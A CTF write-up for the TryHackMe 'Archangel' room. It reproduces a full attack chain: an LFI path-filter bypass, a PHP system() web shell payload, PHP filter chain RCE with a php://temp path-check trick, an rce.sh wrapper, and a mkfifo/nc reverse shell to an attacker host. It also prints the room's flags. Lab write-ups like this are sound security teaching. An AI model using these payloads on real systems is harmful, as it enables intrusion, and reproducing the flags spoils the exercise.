# 😇 Archangel

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/archangel)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com/room/archangel)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com/room/archangel)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com/room/archangel)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `10.48.129.113` |
| **OS** | Ubuntu (kernel 4.15.0-123-generic x86_64) |
| **Attack Surface** | HTTP vhost enumeration, LFI, PHP filter chain RCE |
| **Privesc** | www-data → archangel (out of scope) |

Archangel starts with a single open web port. A contact email in the homepage source leaks a hidden virtual hostname that hosts a PHP page with a Local File Inclusion vulnerability. The LFI is protected by a filter, but reading the PHP source reveals the exact rules — and the rules are easy to bypass. Log poisoning is not possible here, so RCE is achieved via a PHP filter chain with a small trick to pass the path check without breaking the chain.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sS -vv -p- -oA nmap/tcp_syn 10.48.129.113
sudo nmap -sU -vv --top-ports 200 -oA nmap/udp_top 10.48.129.113
```

```
22/tcp  open  SSH
80/tcp  open  HTTP — Apache/2.4.29 (Ubuntu)
68/udp  open|filtered  dhcpc  (noise — ignore)
```

### Directory Bruteforce — archangel

```bash
ffuf -u http://archangel/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_archangel.json
```

```
/                → 200
/images/         → 301
/pages/          → 301  (static HTML templates only)
/flags/          → 301  (dead end)
/layout/         → 301
/licence.txt     → 200
/server-status   → 403
```

### Vhost Discovery

The homepage contact section contained an email address that revealed a second virtual hostname:

```bash
curl -s http://archangel/ | grep -i mail
# → support@mafialive.thm
```

```bash
echo "10.48.129.113 mafialive.thm" | sudo tee -a /etc/hosts
curl -s http://mafialive.thm/
```

First flag in the response. Added to `/etc/hosts` and moved on.

### Directory Bruteforce — mafialive.thm

```bash
ffuf -u http://mafialive.thm/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -v -ic -c -t 50 -e .php,.html,.txt -o nmap/ffuf_mafia.json
```

```
/robots.txt  → 200  (Disallow: /test.php)
/test.php    → 200  ← LFI endpoint
```

---

## 💀 Initial Access — LFI → PHP Filter Chain RCE

### LFI Discovery

`/test.php` had a `?view=` parameter and a button that pre-loaded a local PHP file — a clear sign of file inclusion:

```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
→ "Control is an illusion"
```

### Reading the Filter Logic

Rather than guessing the filter rules, `php://filter` was used to read the raw PHP source of `test.php` as base64 — the file is returned encoded so PHP does not execute it:

```bash
curl -s "http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php" \
  | grep -oP '[A-Za-z0-9+/=]{50,}' | head -1 | base64 -d
```

The source contained a hidden comment with the second flag, and revealed the filter logic:

```php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
```

**Filter rules:**
- Blocks: path containing `../..`
- Requires: path containing `/var/www/html/development_testing`

### LFI Path Traversal Bypass

The filter blocks `../..` as a substring but not `.././`. Swapping every `../` with `.././` gets around it — the path still traverses up directories but never contains the blocked string:

```bash
# Reads /etc/passwd
curl -s "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
...
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
```

### Log Poisoning Attempt (failed)

```bash
curl -s -A '<?php system($_GET["cmd"]); ?>' http://mafialive.thm/
curl -v "http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log&cmd=id"
```

Log poisoning was not possible here.

### PHP Filter Chain RCE

Used the [Synacktiv PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator) to generate `<?php system($_GET["cmd"]); ?>` purely from iconv encoding tricks — no writable file needed.

**The path check bypass:**

The generator outputs a chain ending in `resource=php://temp`. The problem: `php://temp` does not contain `/var/www/html/development_testing`, so the filter rejects it. The fix is to append the required string as a query parameter on the stream URL:

```
resource=php://temp?/var/www/html/development_testing
```

PHP ignores query strings on internal `php://` streams, so the chain still gets its empty input and generates the right PHP code. But `strpos()` sees the required path in the string and lets it through.

```bash
python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
  | tail -1 \
  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/development_testing|' \
  > /tmp/chain.txt
```

Wrapper script to make it easy to run commands:

```bash
#!/bin/bash
# rce.sh — usage: ./rce.sh "command"
CHAIN=$(python3 ./php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
  | tail -1 \
  | sed 's|resource=php://temp|resource=php://temp?/var/www/html/development_testing|')
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$CHAIN")
CMD=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=''))" "$1")
curl -s "http://mafialive.thm/test.php?view=${ENCODED}&cmd=${CMD}" \
  | strings | sed 's/<[^>]*>//g' \
  | grep -v "^[[:space:]]*$" \
  | grep -v "INCLUDE\|Test Page\|button\|Here is\|DOCTYPE\|html\|head\|body\|title\|href"
```

```bash
./rce.sh id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Reverse Shell

```bash
# Listener
nc -nlvp 4444 -s 192.168.240.231

# Trigger
./rce.sh "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.240.231 4444 >/tmp/f"
```

```
connect to [192.168.240.231] from (UNKNOWN) [10.48.129.113] 42158
www-data@ubuntu:/var/www/html/development_testing$
```

### User Flag

```bash
cat /home/archangel/user.txt
```

---

## 🔁 Privilege Escalation

This box was used to build and test the multi-agent CTF workflow. Privilege escalation was not attempted — the engagement stopped at the `www-data` shell after capturing the user flag.

---

## 🗺️ Attack Chain

```
[archangel:80 — Apache/2.4.29]
    |
    | homepage source → support@mafialive.thm
    v
[mafialive.thm vhost]              → Flag 1
    |
    | robots.txt → /test.php
    v
[LFI — test.php?view=]
    |
    | php://filter base64 → test.php source
    v
[Filter Logic Reversed]             → Flag 2
    |  blocks: ../..
    |  requires: /var/www/html/development_testing
    |
    | .././ chaining → /etc/passwd read confirmed
    | log poisoning → not possible
    | PHP filter chain + php://temp?<path> trick → RCE
    v
[www-data shell]
    |
    | /home/archangel/user.txt
    v
                                    → Flag 3 (user.txt)
```

---

## 📌 Key Takeaways

- Always grep page source for email addresses — they can reveal virtual hostnames that aren't linked anywhere
- `strpos()` string filters are easy to bypass when you know the exact rule: blocking `../..` while allowing `.././` leaves a wide open path
- Use `php://filter/convert.base64-encode` to read PHP source code safely without executing it — always do this before trying blind LFI exploitation
- PHP filter chain RCE works with no log file and no upload — just a working LFI and the generator script
- If a path check requires a specific string in the `view` parameter, appending it as a query string on `php://temp` satisfies the check without affecting the chain

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Wordlist Scanning | [T1595.003](https://attack.mitre.org/techniques/T1595/003) |
| Discovery | Network Service Discovery | [T1046](https://attack.mitre.org/techniques/T1046) |
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Credential Access | Unsecured Credentials: Credentials in Files | [T1552.001](https://attack.mitre.org/techniques/T1552/001) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
| Defense Evasion | Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027) |

---

## 🛠️ Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | TCP SYN + UDP port scan |
| `ffuf` | Directory and file bruteforce on both vhosts |
| `curl` | Manual LFI probing, source exfiltration, RCE delivery |
| `php_filter_chain_generator.py` | Generate PHP filter chain RCE payload |
| `rce.sh` | Custom wrapper — URL-encodes chain and delivers commands |
| `nc` | Reverse shell listener |

---

## 🚩 Flags

<details>
<summary><code>Flag 1 — vhost discovery</code></summary>

`thm{f0und_th3_r1ght_h0st_n4m3}`

</details>

<details>
<summary><code>Flag 2 — LFI source read</code></summary>

`thm{explo1t1ng_lf1}`

</details>

<details>
<summary><code>user.txt</code></summary>

`thm{lf1_t0_rc3_1s_tr1cky}`

</details>

